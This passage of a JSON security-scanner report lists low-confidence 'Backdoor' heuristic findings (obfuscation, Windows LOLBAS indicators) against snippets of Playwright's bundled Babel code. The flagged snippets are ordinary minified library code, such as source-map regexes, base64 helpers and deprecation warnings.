                      "markdown": "`apFileCommentRegex\",{get:function(){return/(?:\\/\\/[@#][ \\t]+?sourceMappingURL=([^\\s'\"`]+?)[ \\t]*?$)|(?:\\/\\*[@#][ \\t]+sourceMappingURL=([^*]+?)[ \\t]*?(?:\\*\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:Rf=X0e;function H0e(e){return Buffer.from(e,\"base64\").toString()}function Y0e(e){if(typeof value==\"number\")throw new TypeError(\"The value to decode must not be of type number.\");return new Buffer(e,\"base64\").toString()}function X0e(e){return decodeURIComponent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapF`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1750,
                  "startColumn": 4917,
                  "endLine": 1750,
                  "endColumn": 4923,
                  "snippet": {
                    "text": ";for(let m of e.passes)for(let b of m)b.manipulateOptions&&b.manipulateOptions(p,p.parserOpts);return p}});var qb=E(Lt=>{\"use strict\";Object.defineProperty(Lt,\"commentRegex\",{get:function(){return/^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg}});Object.defineProperty(Lt,\"mapFileCommentRegex\",{get:function(){return/(?:\\/\\/[@#][ \\t]+?sourceMappingURL=([^\\s'\"`]+?)[ \\t]*?$)|(?:\\/\\*[@#][ \\t]+sourceMappingURL=([^*]+?)[ \\t]*?(?:\\*\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:R",
                    "rendered": {
                      "text": ";for(let m of e.passes)for(let b of m)b.manipulateOptions&&b.manipulateOptions(p,p.parserOpts);return p}});var qb=E(Lt=>{\"use strict\";Object.defineProperty(Lt,\"commentRegex\",{get:function(){return/^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg}});Object.defineProperty(Lt,\"mapFileCommentRegex\",{get:function(){return/(?:\\/\\/[@#][ \\t]+?sourceMappingURL=([^\\s'\"`]+?)[ \\t]*?$)|(?:\\/\\*[@#][ \\t]+sourceMappingURL=([^*]+?)[ \\t]*?(?:\\*\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:R",
                      "markdown": "`;for(let m of e.passes)for(let b of m)b.manipulateOptions&&b.manipulateOptions(p,p.parserOpts);return p}});var qb=E(Lt=>{\"use strict\";Object.defineProperty(Lt,\"commentRegex\",{get:function(){return/^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg}});Object.defineProperty(Lt,\"mapFileCommentRegex\",{get:function(){return/(?:\\/\\/[@#][ \\t]+?sourceMappingURL=([^\\s'\"`]+?)[ \\t]*?$)|(?:\\/\\*[@#][ \\t]+sourceMappingURL=([^*]+?)[ \\t]*?(?:\\*\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:R`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1982,
                  "startColumn": 4510,
                  "endLine": 1982,
                  "endColumn": 4514,
                  "snippet": {
                    "text": "ject of main entry condition name keys only.`)}return s}function Wve(e,t,r){if(js().noDeprecation)return;let n=(0,ve().fileURLToPath)(t);J_.has(n+\"|\"+e)||(J_.add(n+\"|\"+e),js().emitWarning(`Use of deprecated trailing slash pattern mapping \"${e}\" in the \"exports\" field module resolution of the package at ${n}${r?` imported from ${(0,ve().fileURLToPath)(r)}`:\"\"}. Mapping specifiers ending in \"/\" is no longer supported.`,\"DeprecationWarning\",\"DEP0155\"))}function Z_(e,t,r,n,s){let i=r.exports;if($ve(i,e,n)&&(i={\".\":i}),oN.call(i,t)&&!t.includes(\"*\")&&!t.endsWith(\"/\")){let c=i[t],f=ka(e,c,\"\",t,n,!1,!1,!",
                    "rendered": {
                      "text": "ject of main entry condition name keys only.`)}return s}function Wve(e,t,r){if(js().noDeprecation)return;let n=(0,ve().fileURLToPath)(t);J_.has(n+\"|\"+e)||(J_.add(n+\"|\"+e),js().emitWarning(`Use of deprecated trailing slash pattern mapping \"${e}\" in the \"exports\" field module resolution of the package at ${n}${r?` imported from ${(0,ve().fileURLToPath)(r)}`:\"\"}. Mapping specifiers ending in \"/\" is no longer supported.`,\"DeprecationWarning\",\"DEP0155\"))}function Z_(e,t,r,n,s){let i=r.exports;if($ve(i,e,n)&&(i={\".\":i}),oN.call(i,t)&&!t.includes(\"*\")&&!t.endsWith(\"/\")){let c=i[t],f=ka(e,c,\"\",t,n,!1,!1,!",
                      "markdown": "`ject of main entry condition name keys only.`)}return s}function Wve(e,t,r){if(js().noDeprecation)return;let n=(0,ve().fileURLToPath)(t);J_.has(n+\"|\"+e)||(J_.add(n+\"|\"+e),js().emitWarning(`Use of deprecated trailing slash pattern mapping \"${e}\" in the \"exports\" field module resolution of the package at ${n}${r?` imported from ${(0,ve().fileURLToPath)(r)}`:\"\"}. Mapping specifiers ending in \"/\" is no longer supported.`,\"DeprecationWarning\",\"DEP0155\"))}function Z_(e,t,r,n,s){let i=r.exports;if($ve(i,e,n)&&(i={\".\":i}),oN.call(i,t)&&!t.includes(\"*\")&&!t.endsWith(\"/\")){let c=i[t],f=ka(e,c,\"\",t,n,!1,!1,!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1980,
                  "startColumn": 10494,
                  "endLine": 1980,
                  "endColumn": 10498,
                  "snippet": {
                    "text": "arentURL:r.href})!==\"module\")return;let i=(0,ve().fileURLToPath)(e.href),a=(0,ve().fileURLToPath)(new(ve()).URL(\".\",t)),o=(0,ve().fileURLToPath)(r);n?pp().resolve(a,n)!==i&&js().emitWarning(`Package ${a} has a \"main\" field set to \"${n}\", excluding the full filename and extension to the resolved file at \"${i.slice(a.length)}\", imported from ${o}.\n Automatic extension resolution of the \"main\" field is deprecated for ES modules.`,\"DeprecationWarning\",\"DEP0151\"):js().emitWarning(`No \"main\" or \"exports\" field defined in the package.json for ${a} resolving the main entry point \"${i.slice(a.length)}\", im",
                    "rendered": {
                      "text": "arentURL:r.href})!==\"module\")return;let i=(0,ve().fileURLToPath)(e.href),a=(0,ve().fileURLToPath)(new(ve()).URL(\".\",t)),o=(0,ve().fileURLToPath)(r);n?pp().resolve(a,n)!==i&&js().emitWarning(`Package ${a} has a \"main\" field set to \"${n}\", excluding the full filename and extension to the resolved file at \"${i.slice(a.length)}\", imported from ${o}.\n Automatic extension resolution of the \"main\" field is deprecated for ES modules.`,\"DeprecationWarning\",\"DEP0151\"):js().emitWarning(`No \"main\" or \"exports\" field defined in the package.json for ${a} resolving the main entry point \"${i.slice(a.length)}\", im",
                      "markdown": "`arentURL:r.href})!==\"module\")return;let i=(0,ve().fileURLToPath)(e.href),a=(0,ve().fileURLToPath)(new(ve()).URL(\".\",t)),o=(0,ve().fileURLToPath)(r);n?pp().resolve(a,n)!==i&&js().emitWarning(`Package ${a} has a \"main\" field set to \"${n}\", excluding the full filename and extension to the resolved file at \"${i.slice(a.length)}\", imported from ${o}.\n Automatic extension resolution of the \"main\" field is deprecated for ES modules.`,\"DeprecationWarning\",\"DEP0151\"):js().emitWarning(`No \"main\" or \"exports\" field defined in the package.json for ${a} resolving the main entry point \"${i.slice(a.length)}\", im`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1980,
                  "startColumn": 10047,
                  "endLine": 1980,
                  "endColumn": 10051,
                  "snippet": {
                    "text": "rn;let o=(0,ve().fileURLToPath)(n),l=jve.exec(a?e:t)!==null;js().emitWarning(`Use of deprecated ${l?\"double slash\":\"leading or trailing slash matching\"} resolving \"${e}\" for module request \"${t}\" ${t===r?\"\":`matched to \"${r}\" `}in the \"${s?\"imports\":\"exports\"}\" field module resolution of the package at ${o}${i?` imported from ${(0,ve().fileURLToPath)(i)}`:\"\"}.`,\"DeprecationWarning\",\"DEP0166\")}function Q_(e,t,r,n){if(js().noDeprecation||sN(e,{parentURL:r.href})!==\"module\")return;let i=(0,ve().fileURLToPath)(e.href),a=(0,ve().fileURLToPath)(new(ve()).URL(\".\",t)),o=(0,ve().fileURLToPath)(r);n?pp().re",
                    "rendered": {
                      "text": "rn;let o=(0,ve().fileURLToPath)(n),l=jve.exec(a?e:t)!==null;js().emitWarning(`Use of deprecated ${l?\"double slash\":\"leading or trailing slash matching\"} resolving \"${e}\" for module request \"${t}\" ${t===r?\"\":`matched to \"${r}\" `}in the \"${s?\"imports\":\"exports\"}\" field module resolution of the package at ${o}${i?` imported from ${(0,ve().fileURLToPath)(i)}`:\"\"}.`,\"DeprecationWarning\",\"DEP0166\")}function Q_(e,t,r,n){if(js().noDeprecation||sN(e,{parentURL:r.href})!==\"module\")return;let i=(0,ve().fileURLToPath)(e.href),a=(0,ve().fileURLToPath)(new(ve()).URL(\".\",t)),o=(0,ve().fileURLToPath)(r);n?pp().re",
                      "markdown": "`rn;let o=(0,ve().fileURLToPath)(n),l=jve.exec(a?e:t)!==null;js().emitWarning(`Use of deprecated ${l?\"double slash\":\"leading or trailing slash matching\"} resolving \"${e}\" for module request \"${t}\" ${t===r?\"\":`matched to \"${r}\" `}in the \"${s?\"imports\":\"exports\"}\" field module resolution of the package at ${o}${i?` imported from ${(0,ve().fileURLToPath)(i)}`:\"\"}.`,\"DeprecationWarning\",\"DEP0166\")}function Q_(e,t,r,n){if(js().noDeprecation||sN(e,{parentURL:r.href})!==\"module\")return;let i=(0,ve().fileURLToPath)(e.href),a=(0,ve().fileURLToPath)(new(ve()).URL(\".\",t)),o=(0,ve().fileURLToPath)(r);n?pp().re`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1957,
                  "startColumn": 16,
                  "endLine": 1957,
                  "endColumn": 20,
                  "snippet": {
                    "text": "  // Cache the returned value forever and don't call this function again.\n  api.cache(true);\n\n  // Don't cache at all. Not recommended because it will be very slow.\n  api.cache(false);\n\n  // Cached based on the value of some function. If this function returns a value different from\n",
                    "rendered": {
                      "text": "  // Cache the returned value forever and don't call this function again.\n  api.cache(true);\n\n  // Don't cache at all. Not recommended because it will be very slow.\n  api.cache(false);\n\n  // Cached based on the value of some function. If this function returns a value different from\n",
                      "markdown": "`  // Cache the returned value forever and don't call this function again.\n  api.cache(true);\n\n  // Don't cache at all. Not recommended because it will be very slow.\n  api.cache(false);\n\n  // Cached based on the value of some function. If this function returns a value different from\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1936,
                  "startColumn": 4767,
                  "endLine": 1936,
                  "endColumn": 4775,
                  "snippet": {
                    "text": "izeConstEnums:!0},{allowDeclareFields:!0})]]};n=function(i,a){if(n&&a.endsWith(t))try{return i._compile((0,k1e.transformFileSync)(a,Object.assign({},s,{filename:a})).code,a)}catch(o){if(!r){let l=gO();a1().lt(l.version,\"7.21.4\")&&console.error(\"`.cts` configuration file failed to load, please try to update `@babel/preset-typescript`.\")}throw o}return require.extensions[\".js\"](i,a)},require.extensions[t]=n}try{return s1(e)}finally{r||(require.extensions[t]===n&&delete require.extensions[t],n=void 0)}}var r1=new Set;function s1(e){if(r1.has(e))return F1e(\"Auto-ignoring usage of config %o.\",e),{};let t;t",
                    "rendered": {
                      "text": "izeConstEnums:!0},{allowDeclareFields:!0})]]};n=function(i,a){if(n&&a.endsWith(t))try{return i._compile((0,k1e.transformFileSync)(a,Object.assign({},s,{filename:a})).code,a)}catch(o){if(!r){let l=gO();a1().lt(l.version,\"7.21.4\")&&console.error(\"`.cts` configuration file failed to load, please try to update `@babel/preset-typescript`.\")}throw o}return require.extensions[\".js\"](i,a)},require.extensions[t]=n}try{return s1(e)}finally{r||(require.extensions[t]===n&&delete require.extensions[t],n=void 0)}}var r1=new Set;function s1(e){if(r1.has(e))return F1e(\"Auto-ignoring usage of config %o.\",e),{};let t;t",
                      "markdown": "`izeConstEnums:!0},{allowDeclareFields:!0})]]};n=function(i,a){if(n&&a.endsWith(t))try{return i._compile((0,k1e.transformFileSync)(a,Object.assign({},s,{filename:a})).code,a)}catch(o){if(!r){let l=gO();a1().lt(l.version,\"7.21.4\")&&console.error(\"`.cts` configuration file failed to load, please try to update `@babel/preset-typescript`.\")}throw o}return require.extensions[\".js\"](i,a)},require.extensions[t]=n}try{return s1(e)}finally{r||(require.extensions[t]===n&&delete require.extensions[t],n=void 0)}}var r1=new Set;function s1(e){if(r1.has(e))return F1e(\"Auto-ignoring usage of config %o.\",e),{};let t;t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1921,
                  "startColumn": 1315,
                  "endLine": 1921,
                  "endColumn": 1319,
                  "snippet": {
                    "text": "e{if(R.node.specifiers.length===0){Gr.set(d.node,!1);continue}for(let Te of R.node.specifiers){let Pe=R.scope.getBinding(Te.local.name);Pe&&!K.has(Pe.path)&&(b({binding:Pe,programPath:d,pragmaImportName:_,pragmaFragImportName:F})?K.add(Pe.path):Gr.set(d.node,!1))}}if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"declaration\")),R.isVariableDeclaration({declare:!0}))for(let K of Object.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterf",
                    "rendered": {
                      "text": "e{if(R.node.specifiers.length===0){Gr.set(d.node,!1);continue}for(let Te of R.node.specifiers){let Pe=R.scope.getBinding(Te.local.name);Pe&&!K.has(Pe.path)&&(b({binding:Pe,programPath:d,pragmaImportName:_,pragmaFragImportName:F})?K.add(Pe.path):Gr.set(d.node,!1))}}if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"declaration\")),R.isVariableDeclaration({declare:!0}))for(let K of Object.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterf",
                      "markdown": "`e{if(R.node.specifiers.length===0){Gr.set(d.node,!1);continue}for(let Te of R.node.specifiers){let Pe=R.scope.getBinding(Te.local.name);Pe&&!K.has(Pe.path)&&(b({binding:Pe,programPath:d,pragmaImportName:_,pragmaFragImportName:F})?K.add(Pe.path):Gr.set(d.node,!1))}}if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"declaration\")),R.isVariableDeclaration({declare:!0}))for(let K of Object.keys(R.getBindingIdentifiers()))(0,zn.registerGlobalType)(O,K);else(R.isTSTypeAliasDeclaration()||R.isTSDeclareFunction()&&R.get(\"id\").isIdentifier()||R.isTSInterf`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1921,
                  "startColumn": 1084,
                  "endLine": 1921,
                  "endColumn": 1088,
                  "snippet": {
                    "text": "&&te===K.size;for(let Te of R.node.specifiers)if(Te.type===\"ImportSpecifier\"&&Te.importKind===\"type\"){(0,zn.registerGlobalType)(O,Te.local.name);let Pe=R.scope.getBinding(Te.local.name);Pe&&K.add(Pe.path)}if(l)Gr.set(d.node,!1);else{if(R.node.specifiers.length===0){Gr.set(d.node,!1);continue}for(let Te of R.node.specifiers){let Pe=R.scope.getBinding(Te.local.name);Pe&&!K.has(Pe.path)&&(b({binding:Pe,programPath:d,pragmaImportName:_,pragmaFragImportName:F})?K.add(Pe.path):Gr.set(d.node,!1))}}if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"decla",
                    "rendered": {
                      "text": "&&te===K.size;for(let Te of R.node.specifiers)if(Te.type===\"ImportSpecifier\"&&Te.importKind===\"type\"){(0,zn.registerGlobalType)(O,Te.local.name);let Pe=R.scope.getBinding(Te.local.name);Pe&&K.add(Pe.path)}if(l)Gr.set(d.node,!1);else{if(R.node.specifiers.length===0){Gr.set(d.node,!1);continue}for(let Te of R.node.specifiers){let Pe=R.scope.getBinding(Te.local.name);Pe&&!K.has(Pe.path)&&(b({binding:Pe,programPath:d,pragmaImportName:_,pragmaFragImportName:F})?K.add(Pe.path):Gr.set(d.node,!1))}}if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"decla",
                      "markdown": "`&&te===K.size;for(let Te of R.node.specifiers)if(Te.type===\"ImportSpecifier\"&&Te.importKind===\"type\"){(0,zn.registerGlobalType)(O,Te.local.name);let Pe=R.scope.getBinding(Te.local.name);Pe&&K.add(Pe.path)}if(l)Gr.set(d.node,!1);else{if(R.node.specifiers.length===0){Gr.set(d.node,!1);continue}for(let Te of R.node.specifiers){let Pe=R.scope.getBinding(Te.local.name);Pe&&!K.has(Pe.path)&&(b({binding:Pe,programPath:d,pragmaImportName:_,pragmaFragImportName:F})?K.add(Pe.path):Gr.set(d.node,!1))}}if(se()&&!l)R.remove();else for(let Te of K)Te.remove();continue}if(R.isExportDeclaration()&&(R=R.get(\"decla`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1921,
                  "startColumn": 805,
                  "endLine": 1921,
                  "endColumn": 809,
                  "snippet": {
                    "text": ".get(\"body\")){if(R.isImportDeclaration()){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),R.node.importKind===\"type\"){for(let Te of R.node.specifiers)(0,zn.registerGlobalType)(O,Te.local.name);R.remove();continue}let K=new Set,te=R.node.specifiers.length,se=()=>te>0&&te===K.size;for(let Te of R.node.specifiers)if(Te.type===\"ImportSpecifier\"&&Te.importKind===\"type\"){(0,zn.registerGlobalType)(O,Te.local.name);let Pe=R.scope.getBinding(Te.local.name);Pe&&K.add(Pe.path)}if(l)Gr.set(d.node,!1);else{if(R.node.specifiers.length===0){Gr.set(d.node,!1);continue}for(let Te of R.node.specifiers)",
                    "rendered": {
                      "text": ".get(\"body\")){if(R.isImportDeclaration()){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),R.node.importKind===\"type\"){for(let Te of R.node.specifiers)(0,zn.registerGlobalType)(O,Te.local.name);R.remove();continue}let K=new Set,te=R.node.specifiers.length,se=()=>te>0&&te===K.size;for(let Te of R.node.specifiers)if(Te.type===\"ImportSpecifier\"&&Te.importKind===\"type\"){(0,zn.registerGlobalType)(O,Te.local.name);let Pe=R.scope.getBinding(Te.local.name);Pe&&K.add(Pe.path)}if(l)Gr.set(d.node,!1);else{if(R.node.specifiers.length===0){Gr.set(d.node,!1);continue}for(let Te of R.node.specifiers)",
                      "markdown": "`.get(\"body\")){if(R.isImportDeclaration()){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),R.node.importKind===\"type\"){for(let Te of R.node.specifiers)(0,zn.registerGlobalType)(O,Te.local.name);R.remove();continue}let K=new Set,te=R.node.specifiers.length,se=()=>te>0&&te===K.size;for(let Te of R.node.specifiers)if(Te.type===\"ImportSpecifier\"&&Te.importKind===\"type\"){(0,zn.registerGlobalType)(O,Te.local.name);let Pe=R.scope.getBinding(Te.local.name);Pe&&K.add(Pe.path)}if(l)Gr.set(d.node,!1);else{if(R.node.specifiers.length===0){Gr.set(d.node,!1);continue}for(let Te of R.node.specifiers)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1921,
                  "startColumn": 643,
                  "endLine": 1921,
                  "endColumn": 647,
                  "snippet": {
                    "text": "mments)for(let R of v.ast.comments){let K=s.exec(R.value);K&&(K[1]?D=K[2]:I=K[2])}let _=I||a;_&&([_]=_.split(\".\"));let F=D||o;F&&([F]=F.split(\".\"));for(let R of d.get(\"body\")){if(R.isImportDeclaration()){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),R.node.importKind===\"type\"){for(let Te of R.node.specifiers)(0,zn.registerGlobalType)(O,Te.local.name);R.remove();continue}let K=new Set,te=R.node.specifiers.length,se=()=>te>0&&te===K.size;for(let Te of R.node.specifiers)if(Te.type===\"ImportSpecifier\"&&Te.importKind===\"type\"){(0,zn.registerGlobalType)(O,Te.local.name);let Pe=R.scope.get",
                    "rendered": {
                      "text": "mments)for(let R of v.ast.comments){let K=s.exec(R.value);K&&(K[1]?D=K[2]:I=K[2])}let _=I||a;_&&([_]=_.split(\".\"));let F=D||o;F&&([F]=F.split(\".\"));for(let R of d.get(\"body\")){if(R.isImportDeclaration()){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),R.node.importKind===\"type\"){for(let Te of R.node.specifiers)(0,zn.registerGlobalType)(O,Te.local.name);R.remove();continue}let K=new Set,te=R.node.specifiers.length,se=()=>te>0&&te===K.size;for(let Te of R.node.specifiers)if(Te.type===\"ImportSpecifier\"&&Te.importKind===\"type\"){(0,zn.registerGlobalType)(O,Te.local.name);let Pe=R.scope.get",
                      "markdown": "`mments)for(let R of v.ast.comments){let K=s.exec(R.value);K&&(K[1]?D=K[2]:I=K[2])}let _=I||a;_&&([_]=_.split(\".\"));let F=D||o;F&&([F]=F.split(\".\"));for(let R of d.get(\"body\")){if(R.isImportDeclaration()){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),R.node.importKind===\"type\"){for(let Te of R.node.specifiers)(0,zn.registerGlobalType)(O,Te.local.name);R.remove();continue}let K=new Set,te=R.node.specifiers.length,se=()=>te>0&&te===K.size;for(let Te of R.node.specifiers)if(Te.type===\"ImportSpecifier\"&&Te.importKind===\"type\"){(0,zn.registerGlobalType)(O,Te.local.name);let Pe=R.scope.get`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 4641,
                  "endLine": 1905,
                  "snippet": {
                    "text": "ct.defineProperty(_a,\"__esModule\",{value:!0});_a.GLOBAL_TYPES=void 0;_a.isGlobalType=r1e;_a.registerGlobalType=n1e;var d_=_a.GLOBAL_TYPES=new WeakMap;function r1e({scope:e},t){return e.hasBinding(t)?!1:d_.get(e).has(t)?!0:(console.warn(`The exported identifier \"${t}\" is not declared in Babel's scope tracker\nas a JavaScript value binding, and \"@babel/plugin-transform-typescript\"\nnever encountered it as a TypeScript type declaration.\nIt will be treated as a JavaScript value.\n\nThis problem is likely caused by another plugin injecting\n\"${t}\" without registering it in the scope tracker. If you are the autho",
                    "rendered": {
                      "text": "ct.defineProperty(_a,\"__esModule\",{value:!0});_a.GLOBAL_TYPES=void 0;_a.isGlobalType=r1e;_a.registerGlobalType=n1e;var d_=_a.GLOBAL_TYPES=new WeakMap;function r1e({scope:e},t){return e.hasBinding(t)?!1:d_.get(e).has(t)?!0:(console.warn(`The exported identifier \"${t}\" is not declared in Babel's scope tracker\nas a JavaScript value binding, and \"@babel/plugin-transform-typescript\"\nnever encountered it as a TypeScript type declaration.\nIt will be treated as a JavaScript value.\n\nThis problem is likely caused by another plugin injecting\n\"${t}\" without registering it in the scope tracker. If you are the autho",
                      "markdown": "`ct.defineProperty(_a,\"__esModule\",{value:!0});_a.GLOBAL_TYPES=void 0;_a.isGlobalType=r1e;_a.registerGlobalType=n1e;var d_=_a.GLOBAL_TYPES=new WeakMap;function r1e({scope:e},t){return e.hasBinding(t)?!1:d_.get(e).has(t)?!0:(console.warn(`The exported identifier \"${t}\" is not declared in Babel's scope tracker\nas a JavaScript value binding, and \"@babel/plugin-transform-typescript\"\nnever encountered it as a TypeScript type declaration.\nIt will be treated as a JavaScript value.\n\nThis problem is likely caused by another plugin injecting\n\"${t}\" without registering it in the scope tracker. If you are the autho`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1779,
                  "startColumn": 5723,
                  "endLine": 1779,
                  "endColumn": 5727,
                  "snippet": {
